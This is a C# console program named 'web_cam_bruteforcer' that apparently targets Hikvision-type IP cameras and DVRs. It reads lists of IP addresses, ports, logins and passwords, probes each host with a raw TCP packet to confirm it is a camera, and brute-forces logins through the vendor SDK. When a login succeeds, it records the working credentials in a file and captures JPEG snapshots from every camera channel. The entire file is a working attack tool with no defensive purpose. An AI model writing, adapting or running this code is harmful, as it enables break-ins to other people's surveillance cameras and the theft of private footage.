using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using HCNetSDK;
using System.Drawing;
using CommandLine;

namespace web_cam_bruteforcer
{
    class Program
    {
        public static string IpsFile = "data/IPs.txt";
        public static string PortsFile = "data/ports.txt";
        public static string LoginFile = "data/logins.txt";
        public static string PasswordFile = "data/passwords.txt";
        public static string PicturesDir = "pictures";
        public static string OutputFile = "output.txt";
        public static bool FastMode;

        static void Main(string[] args)
        {
            var options = new Options();
            if (Parser.Default.ParseArguments(args, options))
            {
                FastMode = options.FastMode;
            }
            CHCNetSDK.NET_DVR_Init();
            if (!FastMode)
                Preparation();
            Thread thread = new Thread(Start);
            thread.Start();
        }

        public static void Preparation()
        {
            if (!Directory.Exists(PicturesDir))
                Directory.CreateDirectory(PicturesDir);

            if (!File.Exists(OutputFile))
                File.Create(OutputFile).Dispose();

            if (!File.Exists(IpsFile) || !File.Exists(PortsFile) || !File.Exists(LoginFile) ||
                !File.Exists(PasswordFile))
            {
                Console.WriteLine("Failed to load data");
                Console.ReadLine();
                Environment.Exit(0);
            }

            foreach (string host in File.ReadAllLines(IpsFile))
            {
                IPAddress ipAddress;
                bool isGoodHost = IPAddress.TryParse(host, out ipAddress);
                if (!isGoodHost)
                {
                    Console.WriteLine("Verify address " + host);
                    Console.ReadLine();
                    Environment.Exit(0);
                }
            }

            foreach (string port in File.ReadAllLines(PortsFile))
            {
                int sp;
                bool isInt = int.TryParse(port, out sp);
                if (!isInt)
                {
                    Console.WriteLine("The port must be a number. Check file ports.txt!");
                    Console.ReadLine();
                    Environment.Exit(0);
                }
                if (sp < 0 || sp > 65535)
                {
                    Console.WriteLine("The range of ports should be from 0 to 65535. Check file ports.txt!");
                    Console.ReadLine();
                    Environment.Exit(0);
                }
            }
        }

        public static void Start()
        {
            string[] logins = File.ReadAllLines(LoginFile);
            string[] passwords = File.ReadAllLines(PasswordFile);
            string[] ports = File.ReadAllLines(PortsFile);

            List<string> ips = File.ReadAllLines(IpsFile).ToList();
            List<Task> tasks = new List<Task>();
            foreach (string ip in ips)
            {
                tasks.Add(Task.Factory.StartNew(() =>
                {
                    foreach (string port in ports)
                    {
                        int scanPort = int.Parse(port);
                        foreach (string login in logins)
                        {
                            foreach (string password in passwords)
                            {
                                Console.ForegroundColor = ConsoleColor.DarkCyan;
                                Console.WriteLine("Used " + ip + ":" + port);
                                Console.ResetColor();
                                if (!IsCamera(ip, scanPort))
                                {
                                    Console.ForegroundColor = ConsoleColor.Red;
                                    Console.WriteLine(ip + ":" + port + " is dead");
                                    Console.ResetColor();
                                    return;
                                }
                                if (BruteCam(ip, scanPort, login, password))
                                {
                                    return;
                                }
                            }
                        }
                    }
                }));
            }
            Task.WaitAll(tasks.ToArray());
            Console.WriteLine("\n\nThe process is complete! Press enter to exit.");
            Console.ReadLine();
        }

        public static bool BruteCam(string ip, int port, string login, string password)
        {
            CHCNetSDK.NET_DVR_DEVICEINFO_V30 deviceInfo = new CHCNetSDK.NET_DVR_DEVICEINFO_V30();
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("Trying " + login + ":" + password + " for " + ip + ":" + port);
            Console.ResetColor();
            int uid = CHCNetSDK.NET_DVR_Login_V30(ip, port, login, password, ref deviceInfo);
            if (uid != -1)
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("Logged in: " + login + ":" + password + "@" + ip + ":" + port);
                Console.ResetColor();
                if (!FastMode)
                {
                    File.AppendAllText(OutputFile, login + ":" + password + "@" + ip + ":" + port + "\n");
                    for (int channel = deviceInfo.byStartChan;
                        channel < deviceInfo.byChanNum + deviceInfo.byStartChan;
                        channel++)
                    {
                        string filename = PicturesDir + "/" + login + "_" + password + "_" + ip + "_" + port + "_" +
                                          channel + ".jpg";
                        CHCNetSDK.NET_DVR_JPEGPARA netDvrJpegpara = new CHCNetSDK.NET_DVR_JPEGPARA
                        {
                            wPicQuality = 0,
                            wPicSize = 2
                        };
                        if (CHCNetSDK.NET_DVR_CaptureJPEGPicture(uid, channel, ref netDvrJpegpara, filename))
                        {
                            Image image = Image.FromFile(filename);
                            string size = image.Width + "x" + image.Height;
                            Console.ForegroundColor = ConsoleColor.Cyan;
                            Console.WriteLine("Downloaded picture (channel " + channel + ", size " + size +
                                              ") from the camera " + ip + ":" +
                                              port);
                            Console.ResetColor();
                        }
                    }
                }
                CHCNetSDK.NET_DVR_Logout_V30(uid);
                return true;
            }
            return false;
        }

        public static bool IsCamera(string server, int port)
        {
            using (TcpClient tcpClient = new TcpClient())
            {
                try
                {
                    byte[] message =
                    {
                        0x00, 0x00, 0x00, 0x20, 0x63, 0x00, 0x00, 0x00,
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
                    };
                    tcpClient.Connect(server, port);
                    NetworkStream networkStream = tcpClient.GetStream();
                    networkStream.Write(message, 0, message.Length);
                    byte[] response = new byte[16];
                    networkStream.Read(response, 0, response.Length);
                    tcpClient.Close();
                    return response[3] == 0x10 && response[7] == response[11];
                }
                catch (Exception)
                {
                    return false;
                }
            }
        }
    }

    class Options
    {
        [Option('f', "fast", DefaultValue = false)]
        public bool FastMode { get; set; }

        [ParserState]
        public IParserState LastParserState { get; set; }

        [HelpOption]
        public string GetUsage()
        {
            return "";
        }
    }
}